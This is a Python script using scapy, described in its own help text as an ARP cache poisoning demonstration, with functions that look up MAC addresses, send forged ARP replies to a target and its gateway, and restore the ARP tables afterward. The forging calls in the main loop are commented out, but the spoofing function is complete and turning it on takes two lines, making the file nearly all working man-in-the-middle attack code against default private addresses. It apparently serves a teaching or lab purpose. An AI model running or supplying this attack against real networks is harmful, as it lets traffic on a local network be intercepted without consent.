from scapy.all import *
import argparse


def getmac(target_ip):
    """
    Obtain the MAC address based on given the IP address
    """
    arp_p = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
    ans = srp(arp_p, timeout=2, verbose=False)
    return ans[0].res[0][1][1].fields['hwsrc']


def spoofarpcache(target_ip, target_mac, source_ip):
    spoofed = ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
    send(spoofed, verbose=False)


def restorearp(target_ip, target_mac, source_ip, source_mac):
    packet = ARP(op=2, hwsrc=source_mac, psrc=source_ip,
                 hwdst=target_mac, pdst=target_ip)
    send(packet, verbose=False)
    print("ARP Table restored to normal for", target_ip)


if __name__ == "__main__":
    # ip_ubuntu = '172.22.243.8'
    # ip_mac = '192.168.1.104'
    ip_windows = '192.168.1.110'
    ip_gateway = '192.168.1.1'

    parser = argparse.ArgumentParser(
        description='ARP cache poisoning demonstration')
    parser.add_argument('-ipa', type=str, default=ip_windows,
                        help='Target IP (Host A IP address)')
    parser.add_argument('-ipb', type=str, default=ip_gateway,
                        help='Gateway IP (Host B IP address)')
    parser.add_argument('-restore', action='store_true')

    args = parser.parse_args()

    # target_ip = input("Enter Target IP (Host A):")
    # gateway_ip = input("Enter Gateway IP (Host B):")
    target_ip = args.ipa
    gateway_ip = args.ipb

    # if args.restore:
    #     restorearp(target_ip, getmac(target_ip), source_ip='192.168.1.1', source_mac='80')
    #     quit()
    try:
        target_mac = getmac(target_ip)
        print("Target MAC:", target_mac)
    except:
        print("Target machine did not respond ARP broadcast.")
        quit()

    try:
        gateway_mac = getmac(gateway_ip)
        print("Gateway MAC:", gateway_mac)
    except:
        print("Gateway is unreachable.")
        quit()

    try:
        print("Sending spoofed ARP responses.")
        while True:
            print(getmac(target_ip))
            # spoofarpcache(target_ip, target_mac, gateway_ip)
            # spoofarpcache(gateway_ip, gateway_mac, target_ip)
    except:
        print("ARP spoofing stopped.")
        restorearp(gateway_ip, gateway_mac, target_ip, target_mac)
        restorearp(target_ip, target_mac, gateway_ip, gateway_mac)
        quit()
